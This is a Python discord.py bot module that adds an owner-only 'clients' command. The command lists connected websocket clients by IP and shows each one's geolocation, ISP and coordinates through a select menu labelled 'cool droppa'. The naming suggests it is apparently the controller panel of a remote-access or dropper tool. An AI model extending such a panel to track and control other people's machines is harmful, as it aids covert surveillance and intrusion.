from discord import app_commands
import discord
from core.functions.websocket.ws_registry import WSRegistry
import config
from ..functions.ip_info import get_ip_info
import time


class Dropper(discord.ui.Select):
    def __init__(self, clients):
        self.clients = clients
        options = []
        for c, v in clients.items():
            options.append(discord.SelectOption(label=v.websocket.remote_address[0], description=f"CID {c}", value=str(c)))
        
    
        super().__init__(placeholder='cool droppa', options=options, min_values=1, max_values=1)

    async def callback(self, interaction: discord.Interaction):
        try:
          if config.local_socket:
              embed = discord.Embed(description=f"{config.no} | This option is disabled in local socket mode", color=config.embederrorcolor)
              await interaction.response.send_message(embed=embed)
              return  
            
          selected_client = self.values[0]
          client = None
          
          for c, v in self.clients.items():
              if c == int(selected_client):
                  client = v
                  
          if client == None:
              embed = discord.Embed(description=f"{config.no} | Client not found", color=config.embederrorcolor)
              await interaction.response.send_message(embed=embed)
              return
          
          
          cinfo = get_ip_info(client.websocket.remote_address[0])
          
          embed = discord.Embed(title=f"{client.websocket.remote_address[0]}'s info", description=f"**CID:** `{client.client_id}`\n> **IP:** `{client.websocket.remote_address[0]}`\n> Connection age: `{int((time.time() - client.age) / 60)}`min\n> **Country:** :flag_{cinfo['country'].lower()}\n> **Region:** {cinfo['region']}\n> **City:** {cinfo['city']}\n> **ISP:** {cinfo['org']}\n> **Timezone:** `{cinfo['timezone']}`\n> Location: `{cinfo['loc']}`", color=config.embedcolor)
          await interaction.response.send_message(embed=embed, ephemeral=True)
          
          
          
          
                  
          
          
                                 
                 
                     
        except Exception as e:
            print(e)
            
class ClientInfo(discord.ui.View):
    def __init__(self, clients):
        super().__init__(timeout=None) 
        self.add_item(Dropper(clients))

@app_commands.command(name="clients", description="Shows a list of all clients with their IP info")
async def clientscmd(interaction: discord.Interaction):
    try:
        if interaction.user.id not in config.owner_ids:
            embed = discord.Embed(description=f"{config.no} | You are not allowed to use this command", color=config.embederrorcolor)
            await interaction.response.send_message(embed=embed)
            return        
        
        clients = WSRegistry.all_clients()
        
        if clients:
          desc = f"**Socket address:** `{WSRegistry.socket_address()}`\n**Total clients:** `{len(clients)}`"  
          
          for c, v in clients.items():
              desc += f"\n> CID **{c}**: `{v.websocket.remote_address[0]}`"
            
          embed = discord.Embed(title="Websocket clients", description=desc, color=config.embedcolor)
          await interaction.response.send_message(embed=embed, view=ClientInfo(clients))
 
    except Exception as e:
        await Bot.error(interaction, Bot, e)  
    
async def setup(bot):
    global Bot 
    Bot = bot
    bot.tree.get_command("socket").add_command(clientscmd)           